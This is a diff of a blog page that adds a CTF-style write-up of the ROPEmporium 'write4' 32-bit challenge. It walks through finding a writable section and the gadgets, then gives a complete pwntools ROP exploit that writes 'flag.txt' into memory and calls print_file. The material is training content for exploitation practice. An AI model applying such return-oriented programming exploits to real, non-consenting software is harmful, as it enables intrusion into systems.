@@ -7,8 +7,8 @@
   <meta http-equiv="X-UA-Compatible" content="IE=edge" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <meta name="author" content="cavefxa" />
-  <meta property="og:url" content="https://cavefxa.com/categories/" />
-  <link rel="canonical" href="https://cavefxa.com/categories/" /><link rel="alternate" type="application/atom+xml" href="https://cavefxa.comindex.xml" title="cavefxa">
+  <meta property="og:url" content="https://cavefxa.com/archived/write432/" />
+  <link rel="canonical" href="https://cavefxa.com/archived/write432/" /><link rel="alternate" type="application/atom+xml" href="https://cavefxa.comindex.xml" title="cavefxa">
 
   <script type="application/ld+json">
   {
@@ -18,28 +18,32 @@
            "@type": "WebPage",
            "@id": "https:\/\/cavefxa.com"
       },
-      "articleSection" : "categories",
-      "name" : "Categories",
-      "headline" : "Categories",
-      "description" : "",
+      "articleSection" : "archived",
+      "name" : "ROPEmporium: write4 32-bit",
+      "headline" : "ROPEmporium: write4 32-bit",
+      "description" : "Writeup of write four [write4] on ROPEmporium Prerequisites: Basic knowledge of assembly, disassembling tools, the previous challenges, and calling convention\nWe\u0026rsquo;re told the following: \u0026ldquo;A PLT entry for a function named print_file() exists within the challenge binary, simply call it with the name of a file you wish to read (like \u0026lsquo;flag.txt\u0026rsquo;) as the 1st argument. The \u0026lsquo;flag.txt\u0026rsquo; isn\u0026rsquo;t present in the binary\u0026rdquo;\nWe need a writeable part of memory, because we need to write the string into the binary.",
       "inLanguage" : "en-US",
       "author" : "cavefxa",
       "creator" : "cavefxa",
       "publisher": "cavefxa",
       "accountablePerson" : "cavefxa",
       "copyrightHolder" : "cavefxa",
-      "copyrightYear" : "0001",
-      "datePublished": "0001-01-01 00:00:00 \u002b0000 UTC",
-      "dateModified" : "0001-01-01 00:00:00 \u002b0000 UTC",
-      "url" : "https:\/\/cavefxa.com\/categories\/",
+      "copyrightYear" : "2021",
+      "datePublished": "2021-05-24 19:41:00 \u002b0200 CEST",
+      "dateModified" : "2021-05-24 19:41:00 \u002b0200 CEST",
+      "url" : "https:\/\/cavefxa.com\/archived\/write432\/",
       "keywords" : [  ]
   }
 </script>
-<title>Categories</title>
-  <meta property="og:title" content="Categories" />
+<title>ROPEmporium: write4 32-bit</title>
+  <meta property="og:title" content="ROPEmporium: write4 32-bit" />
   <meta property="og:type" content="article" />
-  <meta property="og:description" content="" />
-  <meta name="description" content="" />
+  <meta property="og:description" content="Writeup of write four [write4] on ROPEmporium Prerequisites: Basic knowledge of assembly, disassembling tools, the previous challenges, and calling convention
+We&amp;rsquo;re told the following: &amp;ldquo;A PLT entry for a function named print_file() exists within the challenge binary, simply call it with the name of a file you wish to read (like &amp;lsquo;flag.txt&amp;rsquo;) as the 1st argument. The &amp;lsquo;flag.txt&amp;rsquo; isn&amp;rsquo;t present in the binary&amp;rdquo;
+We need a writeable part of memory, because we need to write the string into the binary." />
+  <meta name="description" content="Writeup of write four [write4] on ROPEmporium Prerequisites: Basic knowledge of assembly, disassembling tools, the previous challenges, and calling convention
+We&amp;rsquo;re told the following: &amp;ldquo;A PLT entry for a function named print_file() exists within the challenge binary, simply call it with the name of a file you wish to read (like &amp;lsquo;flag.txt&amp;rsquo;) as the 1st argument. The &amp;lsquo;flag.txt&amp;rsquo; isn&amp;rsquo;t present in the binary&amp;rdquo;
+We need a writeable part of memory, because we need to write the string into the binary." />
   <meta property="og:locale" content="en-us" /><meta property="og:image" content="" />
   
 
@@ -66,10 +70,11 @@
 
 
 <body>
-  <article class="posts">
+  <article class="post " id="article">
     <div class="row">
       <div class="col-xs-12">
-        
+        <div class="site-header">
+          
 <header>
   <div class="header-title">
     <a href="/"
@@ -90,11 +95,103 @@
 </div>
 <div class="header-line"></div>
 
-
-        <h1 class="taxonomy-term"></h1>
-        <div id="posts-list">
-          
         </div>
+        <header class="post-header">
+          <h1 class="post-title">ROPEmporium: write4 32-bit</h1>
+          
+        </header>
+
+        <div class="post-content markdown-body">
+          
+          <h1 id="writeup-of-write-four-write4-on-ropemporium">Writeup of write four [write4] on ROPEmporium</h1>
+<p>Prerequisites: Basic knowledge of assembly, disassembling tools, the previous challenges, and calling convention</p>
+<hr>
+<p>We&rsquo;re told the following: &ldquo;A PLT entry for a function named print_file() exists within the challenge binary,
+simply call it with the name of a file you wish to read (like &lsquo;flag.txt&rsquo;) as the 1st argument. The &lsquo;flag.txt&rsquo; isn&rsquo;t present in the binary&rdquo;</p>
+<p>We need a writeable part of memory, because we need to write the string into the binary.</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>0x080483f0]&gt; iS
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>nth paddr        size vaddr       vsize perm name
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>24  0x00001018    0x8 0x0804a018    0x8 -rw- .data
+</span></span></code></pre></div><p>[Other sections have been removed due to easier readability]</p>
+<p>We&rsquo;re going to write out flag into this section. The section has a size of 8, which is perfect for our payload of 8 characters. Originally I used a different section with a larger size, this caused the string not to be null-terminated, and therefore the payload didn&rsquo;t work.</p>
+<p>Now how are we going to write to this section? That&rsquo;s our next problem. We&rsquo;ll need to use a &ldquo;write/what/where&rdquo; gadget, such as: <code>mov [reg], reg</code>
+The gadget moves the value of reg, into the address pointed to by reg. This is what the [] brackets are for.</p>
+<p>We can open the binary with gdb, and look at the usefulGadgets function (addr found with info func)</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>pwndbg&gt; disass usefulGadgets 
+</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#00f">for</span> function usefulGadgets:
+</span></span><span style="display:flex;"><span>   0x08048543 &lt;+0&gt;: mov    DWORD PTR [edi],ebp
+</span></span><span style="display:flex;"><span>   0x08048545 &lt;+2&gt;: ret    
+</span></span></code></pre></div><p>We have a gadget that moves the value from ebp into the address pointed to by edi. Now we need a gadget, that can control the values in the edi and ebp registers. If we remember
+the crucial basic instruction &ldquo;pop&rdquo;, this is a way of setting a registers value. (It does also increment the stackpointer, but we don&rsquo;t care about that right now)</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cave@noobpwn:~/binexp/ROP-emperium/write4_32$ ROPgadget --binary write432 | grep pop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>0x080485aa : pop edi ; pop ebp ; ret
+</span></span></code></pre></div><p>[Other results removed for readability]</p>
+<p>Great! So we have a gadget to set the registers. Now we&rsquo;ll need to put together the ropchain.</p>
+<pre tabindex="0"><code>pop_edi_pop_ebp + datasegm + b&#34;flag&#34;
+mov_[edi]_ebp
+
+pop_edi_pop_ebp + datasegm+0x4 + b&#34;.txt&#34;
+mov_[edi]_ebp
+
+print_file + datasegm
+</code></pre><p>It&rsquo;s important to remember that the gadget works as a: <code>mov destination, source</code></p>
+<p>The reason for our +0x4, is that we can only have 4 bytes in an address at once. 1 address is equal to 32 bit, which is the same as 4 bytes.</p>
+<p>Now we just need the print_file call, where we need this datasegm (beginning) to be the argument! And flag!:)</p>
+<p>Exploit:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#00f">from</span> pwn <span style="color:#00f">import</span> *
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>elfPath=<span style="color:#a31515">&#34;./write432&#34;</span>
+</span></span><span style="display:flex;"><span>context.arch=<span style="color:#a31515">&#34;i386&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print_file=p32(0x08048538)
+</span></span><span style="display:flex;"><span>datasegm=0x0804a018
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>mov=p32(0x08048543) <span style="color:#008000">#mov [edi], ebp</span>
+</span></span><span style="display:flex;"><span>pop=p32(0x080485aa) <span style="color:#008000">#pop edi; pop ebp</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>gdbscript= <span style="color:#a31515">f</span><span style="color:#a31515">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#a31515">c
+</span></span></span><span style="display:flex;"><span><span style="color:#a31515">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>terminalSetting = [<span style="color:#a31515">&#39;gnome-terminal&#39;</span>, <span style="color:#a31515">&#39;-e&#39;</span>]
+</span></span><span style="display:flex;"><span>context.clear(terminal=terminalSetting)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io = pwnlib.gdb.debug(elfPath, gdbscript = gdbscript)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>mnm = cyclic_gen()
+</span></span><span style="display:flex;"><span>mnm = mnm.get(80)
+</span></span><span style="display:flex;"><span>point=cyclic_find(<span style="color:#a31515">b</span><span style="color:#a31515">&#34;laaa&#34;</span>, endian=<span style="color:#a31515">&#34;little&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#008000">#6161616c is at the return or laaa</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#00f">def</span> main():
+</span></span><span style="display:flex;"><span>    print(io.recvuntil(<span style="color:#a31515">&#34;&gt; &#34;</span>))
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    payload=<span style="color:#a31515">b</span><span style="color:#a31515">&#34;A&#34;</span>*point <span style="color:#008000">#padding</span>
+</span></span><span style="display:flex;"><span>    payload+=pop+p32(datasegm)+<span style="color:#a31515">b</span><span style="color:#a31515">&#34;flag&#34;</span> 
+</span></span><span style="display:flex;"><span>    payload+=mov 
+</span></span><span style="display:flex;"><span>    payload+=pop+p32(datasegm+0x4)+<span style="color:#a31515">b</span><span style="color:#a31515">&#34;.txt&#34;</span> 
+</span></span><span style="display:flex;"><span>    payload+=mov 
+</span></span><span style="display:flex;"><span>    payload+=print_file+p32(datasegm) <span style="color:#008000">#Call print_file with the memory as argument</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    io.send(payload)
+</span></span><span style="display:flex;"><span>    print(io.recv(2048))
+</span></span><span style="display:flex;"><span>    io.interactive()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>main()
+</span></span></code></pre></div>
+        </div>
+
+        <div class="row middle-xs">
+          <div class="col-xs-12">
+            
+          </div>
+        </div>
+        
 
         <div class="site-footer">
   
@@ -114,6 +211,8 @@
     
   
 </script>
+
+  
 
 </body>
 
